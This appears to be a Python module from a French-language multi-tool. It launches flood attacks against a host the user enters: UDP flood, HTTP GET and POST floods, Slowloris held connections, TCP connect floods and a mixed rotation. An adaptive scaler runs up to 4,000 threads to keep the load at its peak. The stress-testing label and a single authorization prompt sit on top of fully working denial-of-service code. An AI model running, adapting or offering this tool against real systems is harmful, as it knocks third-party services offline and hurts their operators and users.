"""Module 13 — Stress-Test : test de charge multi-vecteurs avec threads adaptatifs."""
import random
import socket
import sys
import threading
import time
import urllib.parse

from .. import ui

USER_AGENT = "FCK-Multi-Tool/1.3"
VECTEURS = ["UDP-Flood", "HTTP-GET", "HTTP-POST", "Slowloris", "TCP-Connect", "Mixte"]
ROTATION = ["UDP-Flood", "HTTP-GET", "HTTP-POST", "Slowloris", "TCP-Connect"]
TAILLE_PAYLOAD = 1024


def stress_test():
    ui.module_header(13, "Stress-Test", "Test de charge multi-vecteurs — threads adaptatifs (usage autorise uniquement)")
    ui.note("Usage reserve aux cibles que vous etes autorise a stresser : vos serveurs, labo, accord ecrit.")
    vecteur = ui.ask_choice("Vecteur", VECTEURS, default="UDP-Flood")
    cible = ui.ask_required("Cible (host ou URL)")
    port = ui.ask_int("Port", default=80, minimum=1, maximum=65535)
    duree = ui.ask_int("Duree (secondes)", default=10, minimum=1, maximum=3600)
    threads_max = ui.ask_int("Threads max", default=100, minimum=4, maximum=4000)

    # Normalisation de la cible : le path est jete, scheme+host restent pour HTTP
    info_cible = _parse_target(cible)
    host = info_cible["host"]
    if not host:
        ui.err("Cible invalide : hostname manquant.")
        return

    if not ui.confirm("La cible est-elle une ressource que vous etes autorise a stresser ?"):
        ui.info("Annulation : aucune charge envoyee.")
        return

    try:
        ip = socket.gethostbyname(host)
    except OSError as exc:
        ui.err(f"Resolution impossible pour {host} : {exc}")
        return

    scheme = info_cible["scheme"]
    tls = None
    if scheme == "https":
        import ssl

        tls = ssl.create_default_context()
        tls.check_hostname = False
        tls.verify_mode = ssl.CERT_NONE

    host_header = host if port in (80, 443) else f"{host}:{port}"
    scaler = AdaptiveScaler(4, threads_max)
    state = {
        "vecteur": vecteur,
        "ip": ip,
        "host": host,
        "host_header": host_header,
        "port": port,
        "scheme": scheme,
        "tls": tls,
        "lock": threading.Lock(),
        "running": threading.Event(),
        "scaler": scaler,
        "paquets_reussis": 0,
        "erreurs": 0,
        "octets": 0,
        "fenetre_succes": 0,
        "fenetre_erreurs": 0,
        "vifs": 0,
        "threads": [],
        "payload": _build_payload(TAILLE_PAYLOAD),
    }
    state["running"].set()

    print()
    ui.info(f"Cible : {host} ({ip}:{port}) — vecteur {vecteur}, duree {duree}s, {threads_max} threads max")
    ui.info("Stats en direct — Ctrl+C pour arreter proprement.")

    interrompu = False
    superviseur = None
    debut = time.time()
    try:
        _dimensionner(state, scaler.current)
        superviseur = threading.Thread(target=_superviseur, args=(state,), daemon=True)
        superviseur.start()
        echantillon_temps = debut
        echantillon_total = 0
        dernier_affichage = 0.0
        while time.time() - debut < duree:
            time.sleep(0.2)
            maintenant = time.time()
            if maintenant - dernier_affichage < 0.5:
                continue
            dernier_affichage = maintenant
            ecoule = maintenant - debut
            with state["lock"]:
                total = state["paquets_reussis"]
                erreurs = state["erreurs"]
            # Debit affiche mesure sur une fenetre glissante d'une seconde
            pps = 0.0
            if maintenant - echantillon_temps >= 1.0:
                pps = (total - echantillon_total) / (maintenant - echantillon_temps)
                echantillon_temps = maintenant
                echantillon_total = total
            ligne = (
                f" duree {ecoule:5.1f}s | threads {state['vifs']}/{scaler.current} | "
                f"{pps:9.0f} paquets/s | total {total} | erreurs {erreurs} "
            )
            sys.stdout.write("\r" + ui.paint(ligne.ljust(98), ui.X))
            sys.stdout.flush()
    except KeyboardInterrupt:
        interrompu = True
    finally:
        state["running"].clear()

    sys.stdout.write("\r" + " " * 120 + "\r")
    sys.stdout.flush()
    try:
        _arreter(state, superviseur)
    except KeyboardInterrupt:
        interrompu = True

    with state["lock"]:
        total = state["paquets_reussis"]
        erreurs = state["erreurs"]
        octets = state["octets"]
    duree_reelle = max(time.time() - debut, 0.001)
    print()
    if interrompu:
        ui.info("Arret premature (Ctrl+C).")
    ui.kv([
        ("Duree", f"{duree_reelle:.1f} s"),
        ("Total envoye", f"{total} paquet(s)/requete(s)"),
        ("Erreurs", str(erreurs)),
        ("Threads finaux", str(scaler.current)),
        ("Debit moyen", f"{total / duree_reelle:.0f} /s"),
        ("Octets envoyes", str(octets)),
    ])
    ui.ok("Test termine.")


class AdaptiveScaler:
    def __init__(self, min_threads: int, max_threads: int, initial: int | None = None):
        self.min = max(1, int(min_threads))
        self.max = max(self.min, int(max_threads))
        if initial is None:
            initial = min(self.max, max(self.min, min(50, self.max)))
        self.initial = min(self.max, max(self.min, int(initial)))
        self.current = self.initial

    def update(self, success_delta: int, error_delta: int) -> int:
        # Politique : erreurs majoritaires -> on reduit, sinon succes -> on augmente
        if error_delta > success_delta:
            self.current = max(self.min, int(self.current * 0.7))
        elif success_delta > 0:
            self.current = min(self.max, max(self.min, int(self.current * 1.25) + 1))
        return self.current


def _parse_target(url):
    # Decoupage pur d'une cible (aucun reseau) : host, port, scheme
    texte = (url or "").strip()
    if "//" not in texte:
        texte = "//" + texte
    host = ""
    port = 80
    scheme = "http"
    try:
        morceaux = urllib.parse.urlsplit(texte)
        host = morceaux.hostname or ""
        scheme = (morceaux.scheme or "http").lower()
        if scheme not in ("http", "https"):
            scheme = "http"
        port_explicite = morceaux.port
    except ValueError:
        port_explicite = None
    if port_explicite:
        port = port_explicite
    elif scheme == "https":
        port = 443
    return {"host": host, "port": port, "scheme": scheme}


def _build_payload(size=TAILLE_PAYLOAD):
    # Payload aleatoire, construit une seule fois puis partage en lecture seule
    return bytes(random.getrandbits(8) for _ in range(size))


def _requete_build(host_header, vecteur, path="/"):
    # Construction pure d'une requete HTTP/1.1, sans aucun reseau
    if vecteur == "HTTP-POST":
        corps = "v=13&charge=1"
        brut = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"User-Agent: {USER_AGENT}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(corps)}\r\n"
            "Accept: */*\r\n"
            "Connection: close\r\n"
            "\r\n"
        ) + corps
        return brut.encode("utf-8")
    brut = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"User-Agent: {USER_AGENT}\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    return brut.encode("utf-8")


def _requete_slowloris(host_header):
    # En-tete inacheve : la connexion reste ouverte tant que l'on continue d'ecrire
    brut = (
        "GET / HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"User-Agent: {USER_AGENT}\r\n"
        "X-a: b\r\n"
    )
    return brut.encode("utf-8")


def _compter(state, succes=0, erreur=0, octets=0):
    with state["lock"]:
        state["paquets_reussis"] += succes
        state["erreurs"] += erreur
        state["octets"] += octets
        state["fenetre_succes"] += succes
        state["fenetre_erreurs"] += erreur


def _fermer(sock):
    if sock is None:
        return
    try:
        sock.close()
    except Exception:
        pass


def _attendre(state, secondes):
    # Attente decoupee en tranches pour reagir vite a l'evenement d'arret
    fin = time.time() + secondes
    while state["running"].is_set() and time.time() < fin:
        time.sleep(0.05)


def _ouvrir_connexion(state, timeout):
    sock = socket.create_connection((state["ip"], state["port"]), timeout=timeout)
    if state["scheme"] == "https" and state["tls"] is not None:
        try:
            sock = state["tls"].wrap_socket(sock, server_hostname=state["host"])
        except Exception:
            _fermer(sock)
            raise
    return sock


def _requete_http(state, vecteur):
    sock = None
    try:
        requete = _requete_build(state["host_header"], vecteur)
        sock = _ouvrir_connexion(state, timeout=5.0)
        sock.settimeout(1.0)
        sock.sendall(requete)
        _compter(state, succes=1, octets=len(requete))
        try:
            sock.recv(4096)
        except Exception:
            pass
    except Exception:
        _compter(state, erreur=1)
        _attendre(state, 0.05)
    finally:
        _fermer(sock)


def _unite(state, vecteur, index, udp):
    if vecteur == "UDP-Flood":
        payload = state["payload"]
        interne = udp is None
        sock = udp if udp is not None else socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.sendto(payload, (state["ip"], state["port"]))
            _compter(state, succes=1, octets=len(payload))
        except Exception:
            _compter(state, erreur=1)
        finally:
            if interne:
                _fermer(sock)
        return
    if vecteur == "TCP-Connect":
        sock = None
        try:
            sock = socket.create_connection((state["ip"], state["port"]), timeout=2.0)
            demande = b"GET / HTTP/1.1\r\nHost: probe\r\n\r\n"
            sock.sendall(demande)
            _compter(state, succes=1, octets=len(demande))
        except Exception:
            _compter(state, erreur=1)
            _attendre(state, 0.05)
        finally:
            _fermer(sock)
        return
    if vecteur in ("HTTP-GET", "HTTP-POST"):
        _requete_http(state, vecteur)
        return
    if vecteur == "Slowloris":
        _tenir_connexion(state, index, 1.0)


def _tenir_connexion(state, index, duree=None):
    # Une connexion partielle par worker actif, gardee vivante jusqu'a demotion
    sock = None
    try:
        sock = _ouvrir_connexion(state, timeout=10.0)
        entete = _requete_slowloris(state["host_header"])
        sock.sendall(entete)
        _compter(state, succes=1, octets=len(entete))
        debut = time.time()
        dernier = debut
        while state["running"].is_set() and index < state["scaler"].current:
            _attendre(state, 0.5)
            maintenant = time.time()
            if duree is not None and maintenant - debut >= duree:
                break
            if maintenant - dernier >= 8.0:
                keep = b"X-a: b\r\n"
                sock.sendall(keep)
                _compter(state, succes=1, octets=len(keep))
                dernier = maintenant
    except Exception:
        _compter(state, erreur=1)
        _attendre(state, 0.3)
    finally:
        _fermer(sock)


def _worker(state, index):
    vecteur = state["vecteur"]
    position = index % len(ROTATION)
    udp = None
    try:
        if vecteur in ("UDP-Flood", "Mixte"):
            udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Le worker sort de lui-meme des que son index depasse la cible courante
        while state["running"].is_set() and index < state["scaler"].current:
            if vecteur == "Mixte":
                actif = ROTATION[position]
                position = (position + 1) % len(ROTATION)
            elif vecteur == "Slowloris":
                _tenir_connexion(state, index)
                continue
            else:
                actif = vecteur
            _unite(state, actif, index, udp)
    except Exception:
        pass
    finally:
        _fermer(udp)
        with state["lock"]:
            state["vifs"] = state["vifs"] - 1


def _dimensionner(state, cible):
    # Lance les workers manquants : chaque worker connait son index dans le pool
    with state["lock"]:
        manquants = cible - state["vifs"]
        if manquants <= 0:
            return
        base = state["vifs"]
        state["vifs"] = cible
    for offset in range(manquants):
        thread = threading.Thread(target=_worker, args=(state, base + offset), daemon=True)
        try:
            thread.start()
        except Exception:
            # Limite OS atteinte : on rend la place au compteur et on continue
            with state["lock"]:
                state["vifs"] = state["vifs"] - 1
            continue
        with state["lock"]:
            state["threads"].append(thread)


def _superviseur(state):
    # Une fois par seconde : fenetre precedente -> adaptation -> taille du pool
    while state["running"].is_set():
        _attendre(state, 1.0)
        if not state["running"].is_set():
            return
        with state["lock"]:
            succes = state["fenetre_succes"]
            erreurs = state["fenetre_erreurs"]
            state["fenetre_succes"] = 0
            state["fenetre_erreurs"] = 0
        cible = state["scaler"].update(succes, erreurs)
        _dimensionner(state, cible)


def _arreter(state, superviseur):
    limite = time.time() + 3.0
    if superviseur is not None:
        superviseur.join(timeout=max(0.1, min(1.5, limite - time.time())))
    for thread in list(state["threads"]):
        restant = limite - time.time()
        if restant <= 0:
            break
        thread.join(timeout=min(0.2, restant))
